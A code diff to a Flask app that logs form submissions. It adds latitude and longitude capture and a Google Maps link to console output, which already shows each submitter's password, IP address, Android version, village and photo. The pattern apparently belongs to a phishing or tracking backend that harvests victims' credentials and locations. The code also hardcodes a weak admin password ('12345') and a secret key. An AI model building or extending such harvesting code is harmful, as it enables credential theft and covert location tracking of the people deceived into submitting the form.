@@ -10,7 +10,7 @@ from datetime import datetime
 
 app = Flask(__name__)
 app.secret_key = "deepak_secure_key_2026"
-ADMIN_PASSWORD = "1234"
+ADMIN_PASSWORD = "12345"
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DB_PATH = os.path.join(BASE_DIR, "forms.db")
@@ -54,6 +54,8 @@ def init_db():
             village TEXT NOT NULL,
             android_version TEXT,
             ip_address TEXT,
+            latitude TEXT,
+            longitude TEXT,
             created_at TEXT NOT NULL
         )
     """)
@@ -103,6 +105,8 @@ def submit():
     password = request.form.get("password", "").strip()
     village = request.form.get("village", "").strip()
     android_version = request.form.get("android_version", "").strip()
+    latitude = request.form.get("latitude", "").strip()
+    longitude = request.form.get("longitude", "").strip()
 
     android_info = "Unknown"
     match = re.search(r"Android\s([\d.]+)", android_version)
@@ -165,6 +169,14 @@ def submit():
     print(f"{BOLD}{ctext('Time', CYAN)}{RESET}     : {current_time}")
     print(f"{BOLD}{ctext('Android', CYAN)}{RESET}  : {android_info}")
     print(f"{BOLD}{ctext('IP', MAGENTA)}{RESET}       : {ip_address}")
+    print(f"{BOLD}{ctext('Latitude', CYAN)}{RESET}  : {latitude}")
+    print(f"{BOLD}{ctext('Longitude', CYAN)}{RESET} : {longitude}")
+
+    if latitude and longitude:
+      print(
+        f"{BOLD}{ctext('Map Link', GREEN)}{RESET}  : "
+        f"https://maps.google.com/?q={latitude},{longitude}"
+    )
     print(f"{BOLD}{ctext('Photo', GREEN)}{RESET}    : {saved_photo if saved_photo else 'No photo'}")
     print(ctext("=========================================", MAGENTA))
     print()
